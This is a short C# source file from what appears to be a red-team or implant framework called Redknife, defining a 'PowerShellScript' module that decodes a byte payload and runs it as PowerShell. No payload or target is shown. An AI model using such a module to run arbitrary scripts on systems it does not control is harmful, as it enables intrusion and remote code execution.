using System;

using Redknife.Util;

namespace Redknife.Modules
{
    public class PowerShellScript : BaseModule
    {

        public override void Run()
        {
            PowershellUtil.RunScript(System.Text.Encoding.ASCII.GetString(this.Payload));
        }

    }
}
